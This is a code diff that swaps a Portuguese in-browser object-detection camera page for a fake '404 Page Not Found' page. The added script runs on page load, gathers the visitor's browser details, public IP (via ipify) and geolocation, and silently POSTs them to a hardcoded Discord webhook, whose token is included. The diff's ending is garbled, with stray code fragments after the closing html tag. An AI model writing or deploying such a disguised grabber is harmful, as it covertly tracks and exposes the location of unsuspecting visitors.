@@ -1,258 +1,164 @@
-<!DOCTYPE html><html lang="pt-br">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Test</title>
-  <style>
-    :root { --bg:#0b0b0f; --fg:#eaeaf2; --muted:#a2a2b3; --accent:#6ee7ff; }
-    html,body{height:100%;margin:0;background:var(--bg);color:var(--fg);font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,"Helvetica Neue",Arial,"Noto Sans",sans-serif}
-    .wrap{max-width:960px;margin:0 auto;padding:16px;display:grid;gap:12px}
-    header{display:flex;align-items:center;justify-content:space-between;gap:12px}
-    h1{font-size:clamp(18px,3vw,28px);margin:0}
-    .controls{display:flex;gap:8px;flex-wrap:wrap}
-    button, select{background:#1a1a22;color:var(--fg);border:1px solid #282838;border-radius:12px;padding:10px 14px;font-weight:600;cursor:pointer}
-    button:hover{border-color:#3a3a4a}
-    #info{font-size:14px;color:var(--muted)}
-    .stage{position:relative;aspect-ratio:16/9;border:1px solid #1f2230;border-radius:16px;overflow:hidden;box-shadow:0 10px 30px rgba(0,0,0,.35)}
-    video, canvas{position:absolute;inset:0;width:100%;height:100%;object-fit:cover}
-    canvas{pointer-events:none}
-    .badge{position:absolute;left:10px;bottom:10px;background:rgba(0,0,0,.5);backdrop-filter:blur(6px);padding:6px 10px;border-radius:999px;font-size:12px;border:1px solid #2a2f45}
-    .legend{display:flex;gap:8px;flex-wrap:wrap}
-    .legend span{background:#12121a;border:1px solid #24243a;padding:6px 10px;border-radius:10px;font-size:12px}
-    a{color:var(--accent)}
-  </style>
+<meta charset="UTF-8">
+<title>404 - Page Not Found</title>
+<style>
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: "Segoe UI", "Roboto", sans-serif;
+    background-color: #f4f4f4;
+    color: #333;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    min-height: 100vh;
+    flex-direction: column;
+    text-align: center;
+    padding: 20px;
+  }
+
+  .container {
+    max-width: 600px;
+    margin-top: 50px;
+  }
+
+  h1 {
+    font-size: 100px;
+    font-weight: bold;
+    color: #e74c3c;
+  }
+
+  h2 {
+    font-size: 28px;
+    margin: 10px 0 20px 0;
+    color: #333;
+  }
+
+  p {
+    font-size: 16px;
+    color: #555;
+    margin-bottom: 20px;
+  }
+
+  a {
+    text-decoration: none;
+    color: #fff;
+    background-color: #e74c3c;
+    padding: 12px 28px;
+    border-radius: 5px;
+    font-weight: bold;
+    transition: background-color 0.3s;
+  }
+
+  a:hover {
+    background-color: #c0392b;
+  }
+
+  /* Dino icon */
+  .dino {
+    width: 100px;
+    height: 100px;
+    margin: 20px auto;
+    background-image: url('https://raw.githubusercontent.com/chromium/chromium/main/components/neterror/resources/images/dino.png');
+    background-size: contain;
+    background-repeat: no-repeat;
+    transition: transform 0.3s;
+  }
+
+  .dino:hover {
+    transform: scale(1.1);
+  }
+</style>
 </head>
 <body>
-  <div class="wrap">
-    <header>
-      <h1>Detecção de Objetos em Tempo Real (Câmera do Dispositivo)</h1>
-      <div class="controls">
-        <button id="btnStart">Iniciar</button>
-        <button id="btnStop" disabled>Parar</button>
-        <select id="cameraSelect" title="Escolher câmera"></select>
-      </div>
-    </header><div id="info">Dica: no celular, permita o uso da câmera e use HTTPS. Tentaremos usar a câmera frontal (<code>facingMode: 'user'</code>), mas você pode trocar no seletor.</div>
+  <div class="container">
+    <h1>404</h1>
+    <div class="dino"></div>
+    <h2>Page Not Found</h2>
+    <p>Oops! The page you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
+    <a href="/">Go Back Home</a>
+  </div>
 
-<div class="stage">
-  <video id="video" playsinline autoplay muted></video>
-  <canvas id="canvas"></canvas>
-  <div class="badge" id="status">Modelo: carregando…</div>
-</div>
+<script>
+// Substitua pela URL do seu webhook
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1410679493315530782/kwl6YXWm_YHWMk7kajNsUz0u8VS5PR_e9fEva2g7faMSLm9hr0L6KIxpQjU5PONwSVah';
 
-<div class="legend">
-  <span>Modelo: COCO‑SSD (TFJS) – ~80 classes comuns</span>
-  <span>Privado: tudo roda <em>no seu navegador</em></span>
-  <span>FPS alvo: adaptativo</span>
-</div>
-
-  </div>  <!-- Carrega TensorFlow.js e o modelo COCO-SSD via CDN -->  <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs@4"></script>  <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd@2"></script>  <script>
-    // =============================
-    // Configuração geral
-    // =============================
-    const els = {
-      video: document.getElementById('video'),
-      canvas: document.getElementById('canvas'),
-      status: document.getElementById('status'),
-      btnStart: document.getElementById('btnStart'),
-      btnStop: document.getElementById('btnStop'),
-      cameraSelect: document.getElementById('cameraSelect'),
+async function collectAndSendInfo() {
+  try {
+    // Coletar informações do usuário
+    const info = {
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      platform: navigator.platform,
+      screen: {
+        width: screen.width,
+        height: screen.height
+      },
+      viewport: {
+        width: window.innerWidth,
+        height: window.innerHeight
+      },
+      url: window.location.href,
+      referrer: document.referrer || 'Direct'
     };
 
-    let model = null;           // Modelo COCO-SSD
-    let stream = null;          // MediaStream atual
-    let rafId = null;           // requestAnimationFrame atual
-    let running = false;        // Flag de execução
-
-    // Lista de cores predefinidas (reprodutíveis) para rótulos
-    const colorFor = (() => {
-      const cache = new Map();
-      return (label) => {
-        if (cache.has(label)) return cache.get(label);
-        // Gera uma cor HSL baseada no hash do label
-        const hash = Array.from(label).reduce((a, c) => (a * 31 + c.charCodeAt(0)) >>> 0, 0);
-        const h = hash % 360; // matiz
-        const s = 70, l = 50;
-        const color = `hsl(${h} ${s}% ${l}%)`;
-        cache.set(label, color);
-        return color;
-      };
-    })();
-
-    // Util: Atualiza status/badge
-    function setStatus(text) {
-      els.status.textContent = text;
+    // Tentar obter o IP público
+    try {
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipResponse.json();
+      info.ip = ipData.ip;
+    } catch (ipError) {
+      info.ip = 'Unable to fetch IP';
     }
 
-    // =============================
-    // Câmeras: enumerar e trocar
-    // =============================
-    async function listCameras() {
+    // Tentar obter localização (se permitido)
+    if (navigator.geolocation) {
       try {
-        const devices = await navigator.mediaDevices.enumerateDevices();
-        const videoInputs = devices.filter(d => d.kind === 'videoinput');
-        els.cameraSelect.innerHTML = '';
-        for (const d of videoInputs) {
-          const opt = document.createElement('option');
-          opt.value = d.deviceId;
-          opt.textContent = d.label || `Câmera ${els.cameraSelect.length + 1}`;
-          els.cameraSelect.appendChild(opt);
-        }
-      } catch (err) {
-        console.warn('Não foi possível listar câmeras:', err);
+        const position = await new Promise((resolve, reject) => {
+          navigator.geolocation.getCurrentPosition(resolve, reject, {
+            timeout: 5000,
+            maximumAge: 600000 // 10 minutos
+          });
+        });
+        
+        info.location = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude,
+          accuracy: position.coords.accuracy
+        };
+      } catch (geoError) {
+        info.locationError = geoError.code === 1 ? 'Permission denied' : 'Location unavailable';
       }
+    } else {
+      info.locationError = 'Geolocation not supported';
     }
 
-    async function startCamera(deviceId = null, preferFront = true) {
-      stopCamera();
-      const constraints = {
-        audio: false,
-        video: deviceId ? { deviceId: { exact: deviceId } } : {
-          // Preferência pela câmera frontal do celular
-          facingMode: preferFront ? { ideal: 'user' } : { ideal: 'environment' },
-          width: { ideal: 1280 },
-          height: { ideal: 720 }
-        }
-      };
-      try {
-        stream = await navigator.mediaDevices.getUserMedia(constraints);
-        els.video.srcObject = stream;
-        await els.video.play();
-        await listCameras();
-        // Seleciona a câmera atual no dropdown, se houver deviceId
-        const track = stream.getVideoTracks()[0];
-        const settings = track.getSettings();
-        const currentId = track.getCapabilities ? track.getCapabilities().deviceId : settings.deviceId;
-        // Marca a opção correspondente (se conhecida)
-        Array.from(els.cameraSelect.options).forEach(o => { if (o.value === settings.deviceId) o.selected = true; });
-        resizeCanvas();
-        return true;
-      } catch (err) {
-        console.error('Erro ao abrir câmera:', err);
-        alert('Não foi possível acessar a câmera. Verifique permissões e se está em HTTPS.');
-        return false;
-      }
-    }
+    // Enviar dados para o webhook
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(info)
+    });
 
-    function stopCamera() {
-      if (stream) {
-        stream.getTracks().forEach(t => t.stop());
-        stream = null;
-      }
-    }
+  } catch (err) {
+    console.error('Error collecting/sending info:', err);
+  }
+}
 
-    // =============================
-    // Desenho no canvas
-    // =============================
-    function resizeCanvas() {
-      const { videoWidth: w, videoHeight: h } = els.video;
-      if (!w || !h) return;
-      const dpr = Math.min(window.devicePixelRatio || 1, 2);
-      els.canvas.width = Math.floor(w * dpr);
-      els.canvas.height = Math.floor(h * dpr);
-      els.canvas.style.width = '100%';
-      els.canvas.style.height = '100%';
-    }
-
-    function drawDetections(predictions) {
-      const ctx = els.canvas.getContext('2d');
-      ctx.clearRect(0, 0, els.canvas.width, els.canvas.height);
-      if (!predictions) return;
-
-      const scaleX = els.canvas.width / els.video.videoWidth;
-      const scaleY = els.canvas.height / els.video.videoHeight;
-
-      ctx.lineWidth = 3;
-      ctx.font = `${Math.max(12, Math.round(14 * (els.canvas.width/640)))}px system-ui, sans-serif`;
-
-      for (const p of predictions) {
-        const [x, y, w, h] = p.bbox; // baseado no tamanho original do vídeo
-        const label = `${p.class} ${(p.score * 100).toFixed(0)}%`;
-        const color = colorFor(p.class);
-        ctx.strokeStyle = color;
-        ctx.fillStyle = color;
-
-        // Caixa
-        ctx.strokeRect(x * scaleX, y * scaleY, w * scaleX, h * scaleY);
-
-        // Fundo do rótulo
-        const pad = 6;
-        const textW = ctx.measureText(label).width;
-        const textH = parseInt(ctx.font, 10) + 6;
-        ctx.fillRect(x * scaleX, y * scaleY - textH, textW + pad * 2, textH);
-
-        // Texto
-        ctx.fillStyle = '#0b0b0f';
-        ctx.fillText(label, x * scaleX + pad, y * scaleY - 6);
-      }
-    }
-
-    // =============================
-    // Loop de inferência (adaptativo)
-    // =============================
-    let lastTime = 0;
-    const MIN_INTERVAL = 1000 / 18; // alvo ~18 FPS para equilíbrio
-
-    async function detectLoop(ts) {
-      if (!running) return;
-      rafId = requestAnimationFrame(detectLoop);
-      if (!model || !els.video.videoWidth) return;
-
-      if (ts - lastTime < MIN_INTERVAL) return; // simples throttle
-      lastTime = ts;
-      try {
-        const predictions = await model.detect(els.video);
-        drawDetections(predictions);
-        setStatus(`Rodando • ${predictions.length} objeto(s)`);
-      } catch (err) {
-        console.warn('Falha na inferência:', err);
-      }
-    }
-
-    // =============================
-    // Inicialização do modelo e eventos
-    // =============================
-    async function initModel() {
-      setStatus('Modelo: carregando…');
-      try {
-        // Opção: base 'lite_mobilenet_v2' para dispositivos fracos (comentado para manter padrão)
-        // model = await cocoSsd.load({ base: 'lite_mobilenet_v2' });
-        model = await cocoSsd.load();
-        setStatus('Modelo: pronto');
-      } catch (err) {
-        console.error('Erro ao carregar modelo:', err);
-        alert('Falha ao carregar o modelo COCO-SSD. Verifique a conexão ou o CDN.');
-      }
-    }
-
-    async function startAll() {
-      if (running) return;
-      await initModel();
-      const ok = await startCamera(null, /*preferFront=*/true);
-      if (!ok) return;
-      running = true;
-      els.btnStart.disabled = true;
-      els.btnStop.disabled = false;
-      detectLoop();
-    }
-
-    function stopAll() {
-      running = false;
-      if (rafId) cancelAnimationFrame(rafId);
-      stopCamera();
-      const ctx = els.canvas.getContext('2d');
-      ctx && ctx.clearRect(0,0,els.canvas.width,els.canvas.height);
-      els.btnStart.disabled = false;
-      els.btnStop.disabled = true;
-      setStatus('Parado');
-    }
-
-    // Eventos UI
-    els.btnStart.addEventListener('click', startAll);
-    els.btnStop.addEventListener('click', stopAll);
-    els.cameraSelect.addEventListener('change', async (e) => {
-      const id = e.target.value;
-      if (!id) return;
-      await startCamera(id);
+// Executar a função quando a página carregar
+window.addEventListener('load', collectAndSendInfo);
+</script>
+</body>
+</html>artCamera(id);
     });
 
     // Ajusta canvas quando o vídeo ganhar dimensões
